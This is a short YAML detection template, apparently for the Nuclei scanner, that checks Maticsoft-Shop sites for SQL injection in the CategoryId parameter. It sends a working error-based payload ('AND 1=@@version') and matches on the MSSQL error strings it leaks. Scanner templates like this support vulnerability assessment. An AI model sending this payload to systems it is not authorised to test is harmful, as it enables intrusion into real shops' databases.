id: Maticsoft-Shop-sqli
info:
  name: Maticsoft-Shop商城CategoryId参数SQL注入
  author: Str1am
  severity: high
  tags: Maticsoft,sqli
requests:
  - method: GET
    path:
      - "{{BaseURL}}/NodeProdCategory.aspx?action=GetChildNode&CategoryId=2%20AND%201=@@version"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "nvarchar"
          - "Microsoft SQL Server"
          - "DbHelperSQL"
        part: body
        condition: and
